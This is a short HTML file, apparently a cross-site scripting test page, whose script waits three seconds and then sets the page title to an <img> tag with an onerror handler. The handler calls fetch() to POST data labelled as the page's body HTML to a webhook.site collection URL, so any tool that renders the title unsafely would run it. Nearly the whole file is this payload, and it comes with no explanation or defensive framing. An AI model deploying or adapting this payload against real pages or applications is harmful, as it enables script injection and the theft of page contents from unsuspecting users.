<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Set content script to title</title>
</head>
<body>
  <p>"DATA"</p>
  <script>
    // Function to create a script tag with a POST request
    function createScriptWithPostRequest() {
      var method = "POST";
      var url = "https://webhook.site/e6ee5b29-cbae-45b0-84f2-f09da517960e";
      var body = JSON.stringify({
        Contents: 'document.body.innerHTML'
      });
      var headers = {
        "Content-type": "application/json; charset=UTF-8",
        "mode": "no-cors"
      };

      var fetchString = 'fetch("' + url + '", {method: "' + method + '", body: ' + body + ', headers: ' + JSON.stringify(headers) + '})';
      var XSS = '<img src="adfdsa" onerror=' + fetchString + '/>';

      document.title = XSS;

    }

    // Wait for 3 seconds and then create the script tag with the POST request
    setTimeout(createScriptWithPostRequest, 3000);
  </script>
</body>
</html>
